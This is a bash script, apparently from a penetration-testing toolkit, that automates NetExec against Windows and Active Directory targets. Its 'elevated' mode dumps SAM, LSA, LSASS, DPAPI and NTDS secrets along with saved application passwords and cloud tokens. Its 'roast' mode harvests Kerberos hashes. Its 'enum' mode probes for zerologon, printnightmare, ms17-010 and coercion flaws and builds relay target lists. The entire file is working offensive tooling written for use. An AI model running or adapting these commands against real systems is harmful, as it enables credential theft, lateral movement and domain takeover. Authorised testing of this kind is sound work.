#!/usr/bin/env bash

# ───────── Colors ──────────
C=$(printf '\033')
RED="${C}[1;31m"
GREEN="${C}[1;32m"
YELLOW="${C}[1;33m"
BLUE="${C}[1;34m"
NC="${C}[0m"

# ───────── Usage ──────────
usage() {
  echo -e "${YELLOW}Usage:${NC} $0 <mode> [protocol] <target> [auth] -o <output-dir> [--local-auth]"
  echo ""
  echo "  <mode>        elevated | verify | roast | enum"
  echo "                  elevated: Requires elevated privileges (local admin+) to extract credentials and interesting information for lateral movement"
  echo "                  enum:     Enumerate services using nxc (requires protocol)"
  echo "  [protocol]    ldap | smb | mssql | nfs  (only for enum mode)"
  echo "                  ldap:  LDAP & DC SMB enumeration (requires auth)"
  echo "                  smb:   SMB enumeration (auth: authenticated checks, no auth: signing/anon/guest/vulns)"
  echo "                  mssql: MSSQL enumeration (requires auth)"
  echo "                  nfs:   NFS enumeration (no auth needed)"
  echo "  <target>      Single IP or CIDR"
  echo "  -u            Username"
  echo "  -p            Password"
  echo "  -H            NTLM hash"
  echo "  -d            Domain (passed as -d to nxc)"
  echo "  --aesKey      Kerberos AES key (requires --kdcHost)"
  echo "  --kdcHost     Domain Controller to contact (used with --aesKey)"
  echo "  --use-kcache  Use Kerberos ccache ticket (no user/pass/hash needed)"
  echo "  -o            Output directory (will be created if it doesn't exist)"
  echo "  --delegate    Account to delegate to (passed as --delegate to nxc)"
  echo "  --local-auth  Specify if it's a local account (ignored with --aesKey/--use-kcache)"
  echo "  -h            Show this help"
  exit 1
}

# ───────── Parse Arguments ──────────
MODE="$1"
shift

# For enum mode, next arg is the protocol
PROTOCOL=""
if [[ "$MODE" == "enum" ]]; then
  PROTOCOL="$1"
  shift
fi

TARGET="$1"
shift

LOCAL_AUTH=0
AESKEY=""
KDCHOST=""
DOMAIN=""
DELEGATE=""
USE_KCACHE=0
USER_SET=0

# Pre-scan args for long options
for arg in "$@"; do
  case "$arg" in
  --local-auth)
    LOCAL_AUTH=1
    set -- "${@/--local-auth/}"
    ;;
  --use-kcache)
    USE_KCACHE=1
    set -- "${@/--use-kcache/}"
    ;;
  --aesKey) AESKEY_SET=1 ;;
  --kdcHost) KDCHOST_SET=1 ;;
  --delegate) ;; # handled in main loop
  esac
done

while [[ $# -gt 0 ]]; do
  case "$1" in
  -u)
    USER="$2"
    USER_SET=1
    shift 2
    ;;
  -p)
    PASS="$2"
    shift 2
    ;;
  -H)
    HASH="$2"
    shift 2
    ;;
  -d)
    DOMAIN="$2"
    shift 2
    ;;
  --aesKey)
    AESKEY="$2"
    shift 2
    ;;
  --kdcHost)
    KDCHOST="$2"
    shift 2
    ;;
  --delegate)
    DELEGATE="$2"
    shift 2
    ;;
  -o)
    OUTDIR="$2"
    shift 2
    ;;
  -h) usage ;;
  *) shift ;;
  esac
done

# ───────── Fallback: source engagement.env if OUTDIR not set ──────────
if [[ -z "$OUTDIR" ]]; then
  if [[ -n "$SUDO_USER" ]]; then
    _home=$(getent passwd "$SUDO_USER" | cut -d: -f6)
  else
    _home="$HOME"
  fi
  _env="${_home}/.config/NotSliver/engagement.env"
  if [[ -f "$_env" ]]; then
    source "$_env"
  fi
fi

# ───────── Validate Arguments ──────────
if [[ -z "$MODE" || -z "$TARGET" || -z "$OUTDIR" ]]; then
  usage
fi

if [[ "$MODE" != "elevated" && "$MODE" != "verify" && "$MODE" != "roast" && "$MODE" != "enum" ]]; then
  echo -e "${RED}[-] Mode must be one of: elevated, verify, roast, enum${NC}"
  usage
fi

if [[ "$MODE" == "enum" ]]; then
  if [[ "$PROTOCOL" != "ldap" && "$PROTOCOL" != "smb" && "$PROTOCOL" != "mssql" && "$PROTOCOL" != "nfs" ]]; then
    echo -e "${RED}[-] enum protocol must be one of: ldap, smb, mssql, nfs${NC}"
    usage
  fi
fi

# Determine if auth is needed/provided
HAS_AUTH=0
if [[ $USE_KCACHE -eq 1 || $USER_SET -eq 1 ]]; then
  HAS_AUTH=1
fi

# Auth requirement check (skip for enum smb without auth and enum nfs)
if [[ "$MODE" == "enum" && "$PROTOCOL" == "nfs" ]]; then
  : # NFS needs no auth
elif [[ "$MODE" == "enum" && "$PROTOCOL" == "smb" && $HAS_AUTH -eq 0 ]]; then
  : # SMB can run unauthenticated checks
else
  if [[ $USE_KCACHE -eq 0 && $USER_SET -eq 0 ]]; then
    echo -e "${RED}[-] Username (-u) is required unless using --use-kcache${NC}"
    usage
  fi
fi

# auth validation (only when auth is provided)
if [[ $HAS_AUTH -eq 1 ]]; then
  if [[ $USE_KCACHE -eq 1 ]]; then
    if [[ -n "$PASS" || -n "$HASH" || -n "$AESKEY" ]]; then
      echo -e "${RED}[-] Cannot use --use-kcache with -p, -H, or --aesKey${NC}"
      usage
    fi
  elif [[ -n "$AESKEY" ]]; then
    if [[ -z "$KDCHOST" ]]; then
      echo -e "${RED}[-] --aesKey requires --kdcHost${NC}"
      usage
    fi
    if [[ -n "$PASS" || -n "$HASH" ]]; then
      echo -e "${RED}[-] Cannot use --aesKey with -p or -H${NC}"
      usage
    fi
  else
    if [[ -z "$PASS" && -z "$HASH" ]]; then
      echo -e "${RED}[-] Must specify either -p, -H, --aesKey+--kdcHost, or --use-kcache${NC}"
      usage
    elif [[ -n "$PASS" && -n "$HASH" ]]; then
      echo -e "${RED}[-] Specify only one of -p or -H${NC}"
      usage
    fi
  fi
fi

# ───────── Log file setup ──────────
if [[ "$MODE" == "verify" ]]; then
  LOGFILE="$OUTDIR"/"${USER:-kcache}_${MODE}.log"
elif [[ "$MODE" == "enum" ]]; then
  LOGFILE="$OUTDIR"/"${TARGET}_enum_${PROTOCOL}.log"
else
  LOGFILE="$OUTDIR"/"${TARGET}_${MODE}.log"
fi

if [[ "$MODE" == "elevated" ]]; then
  CREDFILE="$OUTDIR"/"${TARGET}_creds.log"
  INTERESTINGFILE="$OUTDIR"/"${TARGET}_interesting.log"
fi

mkdir -p "$OUTDIR"
touch "$LOGFILE"

# ───────── Helper functions ──────────
log() {
  local msg="$1"
  local additional_file="$2"

  if [[ -n "$additional_file" ]]; then
    echo -e "${BLUE}[+]${NC} $msg" | tee -a "$LOGFILE" | tee -a "$additional_file"
  else
    echo -e "${BLUE}[+]${NC} $msg" | tee -a "$LOGFILE"
  fi
}

run_nxc() {
  log "Running: $*"
  unbuffer "$@" | tee -a "$LOGFILE"
}

run_nxc_creds() {
  log "Running: $*" "$CREDFILE"
  unbuffer "$@" | tee -a "$LOGFILE" | tee -a "$CREDFILE"
}

run_nxc_interesting() {
  log "Running: $*" "$INTERESTINGFILE"
  unbuffer "$@" | tee -a "$LOGFILE" | tee -a "$INTERESTINGFILE"
}

run_enum() {
  local outfile="$1"
  shift
  log "Running: $*"
  unbuffer "$@" 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/$outfile"
}

# ───────── Build auth flags ──────────
if [[ $HAS_AUTH -eq 1 ]]; then
  if [[ $USE_KCACHE -eq 1 ]]; then
    BASE_AUTH_ARGS="--use-kcache -k"
  else
    BASE_AUTH_ARGS="-u $USER"
    if [[ -n "$PASS" ]]; then
      BASE_AUTH_ARGS+=" -p $PASS"
    elif [[ -n "$HASH" ]]; then
      BASE_AUTH_ARGS+=" -H $HASH"
    elif [[ -n "$AESKEY" ]]; then
      BASE_AUTH_ARGS+=" --aesKey $AESKEY --kdcHost $KDCHOST"
    fi
  fi

  if [[ -n "$DOMAIN" ]]; then
    BASE_AUTH_ARGS+=" -d $DOMAIN"
  fi

  # Add --kdcHost if set and not already added via --aesKey
  if [[ -n "$KDCHOST" && -z "$AESKEY" ]]; then
    BASE_AUTH_ARGS+=" --kdcHost $KDCHOST"
  fi

  if [[ -n "$DELEGATE" ]]; then
    BASE_AUTH_ARGS+=" --delegate $DELEGATE"
  fi

  AUTH_ARGS="$BASE_AUTH_ARGS"
  if [[ $LOCAL_AUTH -eq 1 && $USE_KCACHE -eq 0 && -z "$AESKEY" ]]; then
    AUTH_ARGS+=" --local-auth"
  fi
else
  BASE_AUTH_ARGS=""
  AUTH_ARGS=""
fi

# ───────── Mode Logic ──────────
case "$MODE" in
elevated)
  log "Starting credential and information collection…"

  # Main credential dumping
  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS --sam
  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS -M lsassy
  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS --lsa
  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS --dpapi

  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS -M wifi
  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS -M winscp
  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS -M rdcman
  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS --sccm
  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS -M ntdsutil
  log "Running: nxc smb $TARGET $AUTH_ARGS --ntds" "$CREDFILE"
  script -efqa "$LOGFILE" -c "printf 'Y\n' | nxc smb $TARGET $AUTH_ARGS --ntds" | tee -a "$CREDFILE"

  # Interesting information commands (in order from nxc smb -L)
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M bitlocker
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M eventlog_creds
  # run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M handlekatz # Need handlekatz on system
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M iis
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M hash_spider
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M keepass_discover
  log "Use -M keepass_trigger if found" "$INTERESTINGFILE"
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M mobaxterm
  # run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M mremoteng # Prompts for password and gets stuck
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M msol
  # run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M nanodump # Require nanodump on system
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M notepad
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M notepad++
  # run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M ntds-dump-raw # We have ntdsutil?
  # run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M powershell_history # Only need one of the powershell history
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M powershell_history -o EXPORT=True
  # run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M procdump # Require pypykatz
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M putty
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M recent_files
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M recyclebin
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M reg-winlogon
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M security-questions
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M snipped
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M teams_localdb
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M veeam
  # run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M vnc # Prompts for password and gets stuck

  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M wam # Azure and M365 tokens

  # Other session enumeration
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M get_netconnections
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M runasppl
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS --qwinsta
  log "Look at \"Impersonate logged-on User\" section in wiki in case of found sessions" "$INTERESTINGFILE"
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M impersonate
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M wcc # Security conf


  log "Extracting potential credential lines…"
  CREDFILE_PARSED="$OUTDIR"/"${TARGET}_creds_parsed.txt"
  awk '{for (i=5; i<=NF; i++) printf $i (i<NF ? OFS : ORS)}' "$CREDFILE" |
    rg -a '^\x1b\[1;33m|^Node' |
    sed -r 's/\x1b\[[0-9;]*m//g' |
    sort -u >"$CREDFILE_PARSED"

  # Check for GMSA account
  if grep -qF "SC_GMSA" "$CREDFILE"; then
    GMSA_MSG="GMSA Account found! See Extract gMSA Secrets in wiki"
    echo -e "${BLUE}[+]${NC} $GMSA_MSG" | tee -a "$LOGFILE" | tee -a "$CREDFILE_PARSED"
  fi

  echo -e "${GREEN}[✓] Raw output:           ${LOGFILE}"
  echo -e "${GREEN}[✓] Credentials (raw):    ${CREDFILE}"
  echo -e "${GREEN}[✓] Credentials (parsed): ${CREDFILE_PARSED}"
  echo -e "${GREEN}[✓] Interesting info:     ${INTERESTINGFILE}"
  ;;

verify)
  log "Starting service verification…"

  # Build SSH auth args (no domain - SSH doesn't support -d)
  SSH_AUTH_ARGS=""
  if [[ $HAS_AUTH -eq 1 ]]; then
    if [[ $USE_KCACHE -eq 1 ]]; then
      SSH_AUTH_ARGS="--use-kcache -k"
    else
      SSH_AUTH_ARGS="-u $USER"
      if [[ -n "$PASS" ]]; then
        SSH_AUTH_ARGS+=" -p $PASS"
      elif [[ -n "$HASH" ]]; then
        SSH_AUTH_ARGS+=" -H $HASH"
      elif [[ -n "$AESKEY" ]]; then
        SSH_AUTH_ARGS+=" --aesKey $AESKEY --kdcHost $KDCHOST"
      fi
      if [[ -n "$KDCHOST" && -z "$AESKEY" ]]; then
        SSH_AUTH_ARGS+=" --kdcHost $KDCHOST"
      fi
      if [[ -n "$DELEGATE" ]]; then
        SSH_AUTH_ARGS+=" --delegate $DELEGATE"
      fi
    fi
  fi

  run_nxc nxc smb "$TARGET" $AUTH_ARGS --shares
  run_nxc nxc rdp "$TARGET" $BASE_AUTH_ARGS
  run_nxc nxc winrm "$TARGET" $BASE_AUTH_ARGS
  if [[ -z "$HASH" ]]; then
    run_nxc nxc ssh "$TARGET" $SSH_AUTH_ARGS
    if [[ -n "$DOMAIN" && -n "$USER" && $USE_KCACHE -eq 0 ]]; then
      run_nxc nxc ssh "$TARGET" -u "${USER}@${DOMAIN}" -p "$PASS"
    fi
  else
    log "Skipping SSH (hash auth not supported)"
  fi
  run_nxc nxc mssql "$TARGET" $BASE_AUTH_ARGS
  run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --query "(sAMAccountName=$USER)" "sAMAccountName memberOf"

  sed 's/\r/\n/g' "$LOGFILE" | rg -v Running >"$LOGFILE.tmp" && mv "$LOGFILE.tmp" "$LOGFILE"
  echo -e "${GREEN}[✓] Logfile output:       ${LOGFILE}"
  ;;

roast)
  log "Starting kerberoast & asreproast…"
  run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --kdcHost "$TARGET" --kerberoasting "$OUTDIR/kerberoast.hash"
  run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --kdcHost "$TARGET" --asreproast "$OUTDIR/asrep.hash"
  run_nxc nxc smb "$TARGET" -M timeroast -o OUTPUT="$OUTDIR/timeroast.hash"
  echo -e "${GREEN}[✓] Kerberoast hashes:    $OUTDIR/kerberoast.hash"
  echo -e "${GREEN}[✓] ASREProast hashes:    $OUTDIR/asrep.hash"
  echo -e "${GREEN}[✓] Timeroast hashes:     $OUTDIR/timeroast.hash"
  ;;

enum)
  case "$PROTOCOL" in
  ldap)
    log "Starting LDAP & DC SMB enumeration…"

    # ── nxc ldap: Retrieve useful information on the domain ──
    run_enum "atm_ldap_find_delegation.txt"          nxc ldap "$TARGET" $BASE_AUTH_ARGS --find-delegation
    run_enum "atm_ldap_trusted_for_delegation.txt"   nxc ldap "$TARGET" $BASE_AUTH_ARGS --trusted-for-delegation
    run_enum "atm_ldap_admin_count.txt"              nxc ldap "$TARGET" $BASE_AUTH_ARGS --admin-count
    run_enum "atm_ldap_groups_backup_operators.txt"  nxc ldap "$TARGET" $BASE_AUTH_ARGS --groups "Backup Operators"
    run_enum "atm_ldap_groups_domain_admins.txt"     nxc ldap "$TARGET" $BASE_AUTH_ARGS --groups "Domain Admins"
    run_enum "atm_ldap_dc_list.txt"                  nxc ldap "$TARGET" $BASE_AUTH_ARGS --dc-list
    run_enum "atm_ldap_get_sid.txt"                  nxc ldap "$TARGET" $BASE_AUTH_ARGS --get-sid
    run_enum "atm_ldap_pso.txt"                      nxc ldap "$TARGET" $BASE_AUTH_ARGS --pso

    # ── nxc ldap: Low Privilege Modules > Enumeration ──
    run_enum "atm_ldap_adcs.txt"                     nxc ldap "$TARGET" $BASE_AUTH_ARGS -M adcs
    run_enum "atm_ldap_badsuccessor.txt"             nxc ldap "$TARGET" $BASE_AUTH_ARGS -M badsuccessor
    run_enum "atm_ldap_certipy_find.txt"             nxc ldap "$TARGET" $BASE_AUTH_ARGS -M certipy-find -o ENABLED=true TEXT=true
    run_enum "atm_ldap_dns_nonsecure.txt"            nxc ldap "$TARGET" $BASE_AUTH_ARGS -M dns-nonsecure
    run_enum "atm_ldap_dump_computers.txt"           nxc ldap "$TARGET" $BASE_AUTH_ARGS -M dump-computers
    run_enum "atm_ldap_entra_id.txt"                 nxc ldap "$TARGET" $BASE_AUTH_ARGS -M entra-id
    run_enum "atm_ldap_get_network.txt"              nxc ldap "$TARGET" $BASE_AUTH_ARGS -M get-network -o ALL=true
    run_enum "atm_ldap_obsolete.txt"                 nxc ldap "$TARGET" $BASE_AUTH_ARGS -M obsolete
    run_enum "atm_ldap_pso_module.txt"               nxc ldap "$TARGET" $BASE_AUTH_ARGS -M pso
    run_enum "atm_ldap_subnets.txt"                  nxc ldap "$TARGET" $BASE_AUTH_ARGS -M subnets

    # ── nxc ldap: Low Privilege Modules > Credential Dumping ──
    run_enum "atm_ldap_get_desc_users.txt"           nxc ldap "$TARGET" $BASE_AUTH_ARGS -M get-desc-users
    run_enum "atm_ldap_get_info_users.txt"           nxc ldap "$TARGET" $BASE_AUTH_ARGS -M get-info-users
    run_enum "atm_ldap_get_unixUserPassword.txt"     nxc ldap "$TARGET" $BASE_AUTH_ARGS -M get-unixUserPassword
    run_enum "atm_ldap_get_userPassword.txt"         nxc ldap "$TARGET" $BASE_AUTH_ARGS -M get-userPassword
    run_enum "atm_ldap_laps.txt"                     nxc ldap "$TARGET" $BASE_AUTH_ARGS -M laps

    # ── nxc ldap: Low Privilege Modules > Privilege Escalation ──
    run_enum "atm_ldap_pre2k.txt"                    nxc ldap "$TARGET" $BASE_AUTH_ARGS -M pre2k

    # ── nxc smb (DC): Mapping/Enumeration ──
    run_enum "atm_dc_smb_shares.txt"                 nxc smb "$TARGET" $AUTH_ARGS --shares
    run_enum "atm_dc_smb_users.txt"                  nxc smb "$TARGET" $AUTH_ARGS --users
    run_enum "atm_dc_smb_local_groups.txt"           nxc smb "$TARGET" $AUTH_ARGS --local-groups
    run_enum "atm_dc_smb_pass_pol.txt"               nxc smb "$TARGET" $AUTH_ARGS --pass-pol

    # ── nxc smb (DC): Low Privilege Modules > Credential Dumping ──
    run_enum "atm_dc_smb_gpp_autologin.txt"          nxc smb "$TARGET" $AUTH_ARGS -M gpp_autologin
    run_enum "atm_dc_smb_gpp_password.txt"           nxc smb "$TARGET" $AUTH_ARGS -M gpp_password

    echo -e "${GREEN}[✓] Logfile output:       ${LOGFILE}"
    ;;

  smb)
    if [[ $HAS_AUTH -eq 1 ]]; then
      log "Starting authenticated SMB enumeration…"

      # ── nxc smb: Mapping/Enumeration ──
      run_enum "atm_smb_shares.txt"              nxc smb "$TARGET" $AUTH_ARGS --shares
      run_enum "atm_smb_shares_rw.txt"           nxc smb "$TARGET" $AUTH_ARGS --filter-shares "read,write"
      run_enum "atm_smb_shares_r.txt"            nxc smb "$TARGET" $AUTH_ARGS --filter-shares "read"
      run_enum "atm_smb_shares_w.txt"            nxc smb "$TARGET" $AUTH_ARGS --filter-shares "write"
      run_enum "atm_smb_disks.txt"               nxc smb "$TARGET" $AUTH_ARGS --disks
      run_enum "atm_smb_users.txt"               nxc smb "$TARGET" $AUTH_ARGS --users
      run_enum "atm_smb_local_groups.txt"        nxc smb "$TARGET" $AUTH_ARGS --local-groups
      run_enum "atm_smb_rid_brute.txt"           nxc smb "$TARGET" $AUTH_ARGS --rid-brute
      run_enum "atm_smb_reg_sessions.txt"        nxc smb "$TARGET" $AUTH_ARGS --reg-sessions
      run_enum "atm_smb_tasklist.txt"            nxc smb "$TARGET" $AUTH_ARGS --tasklist

      # ── nxc smb: Low Privilege Modules > Enumeration ──
      run_enum "atm_smb_enum_av.txt"             nxc smb "$TARGET" $AUTH_ARGS -M enum_av
      run_enum "atm_smb_ioxidresolver.txt"       nxc smb "$TARGET" $AUTH_ARGS -M ioxidresolver
      run_enum "atm_smb_nopac.txt"               nxc smb "$TARGET" $AUTH_ARGS -M nopac
      run_enum "atm_smb_ntlm_reflection.txt"     nxc smb "$TARGET" $AUTH_ARGS -M ntlm_reflection

      # ── nxc smb: Low Privilege Modules > Credential Dumping ──
      run_enum "atm_smb_spider_plus.txt"         nxc smb "$TARGET" $AUTH_ARGS -M spider_plus

      # ── nxc smb: Low Privilege Modules > Privilege Escalation ──
      run_enum "atm_smb_coerce_plus.txt"         nxc smb "$TARGET" $AUTH_ARGS -M coerce_plus

      # ── nxc smb: High Privilege Modules > Credential Dumping ──
      run_enum "atm_smb_reg_winlogon.txt"        nxc smb "$TARGET" $AUTH_ARGS -M reg-winlogon

    else
      log "Starting unauthenticated SMB enumeration…"

      # ── nxc smb: SMB signing check ──
      run_enum "atm_smb_signing.txt"             nxc smb "$TARGET" --gen-relay-list "$OUTDIR/atm_smb_relay_list.txt"

      # ── nxc smb: Anonymous/Guest access ──
      run_enum "atm_smb_anonlogin.txt"           nxc smb "$TARGET" -u '' -p '' --shares
      run_enum "atm_smb_guestlogin.txt"          nxc smb "$TARGET" -u 'a' -p '' --shares

      # ── nxc smb: Low Privilege Modules > Enumeration (no auth) ──
      run_enum "atm_smb_ms17-010.txt"            nxc smb "$TARGET" -u '' -p '' -M ms17-010
      run_enum "atm_smb_nopac.txt"               nxc smb "$TARGET" -u '' -p '' -M nopac
      run_enum "atm_smb_ntlm_reflection.txt"     nxc smb "$TARGET" -u '' -p '' -M ntlm_reflection
      run_enum "atm_smb_printnightmare.txt"      nxc smb "$TARGET" -u '' -p '' -M printnightmare
      run_enum "atm_smb_remove-mic.txt"          nxc smb "$TARGET" -u '' -p '' -M remove-mic
      run_enum "atm_smb_smbghost.txt"            nxc smb "$TARGET" -u '' -p '' -M smbghost
      run_enum "atm_smb_zerologon.txt"           nxc smb "$TARGET" -u '' -p '' -M zerologon

      # ── nxc smb: Low Privilege Modules > Privilege Escalation (no auth) ──
      run_enum "atm_smb_coerce_plus.txt"         nxc smb "$TARGET" -u '' -p '' -M coerce_plus
    fi

    echo -e "${GREEN}[✓] Logfile output:       ${LOGFILE}"
    ;;

  mssql)
    log "Starting MSSQL enumeration…"

    # ── nxc mssql: Mapping/Enumeration ──
    run_enum "atm_mssql_rid_brute.txt"           nxc mssql "$TARGET" $AUTH_ARGS --rid-brute

    # ── nxc mssql: Low Privilege Modules > Enumeration ──
    run_enum "atm_mssql_enum_impersonate.txt"    nxc mssql "$TARGET" $AUTH_ARGS -M enum_impersonate
    run_enum "atm_mssql_enum_links.txt"          nxc mssql "$TARGET" $AUTH_ARGS -M enum_links
    run_enum "atm_mssql_enum_logins.txt"         nxc mssql "$TARGET" $AUTH_ARGS -M enum_logins

    # ── nxc mssql: Low Privilege Modules > Privilege Escalation ──
    run_enum "atm_mssql_mssql_priv.txt"          nxc mssql "$TARGET" $AUTH_ARGS -M mssql_priv

    echo -e "${GREEN}[✓] Logfile output:       ${LOGFILE}"
    ;;

  nfs)
    log "Starting NFS enumeration…"

    run_enum "atm_nfs_shares.txt"                nxc nfs "$TARGET" --shares
    run_enum "atm_nfs_enum_shares.txt"           nxc nfs "$TARGET" --enum-shares
    run_enum "atm_nfs_root_escape.txt"           nxc nfs "$TARGET" --ls '/'

    echo -e "${GREEN}[✓] Logfile output:       ${LOGFILE}"
    ;;
  esac
  ;;
esac
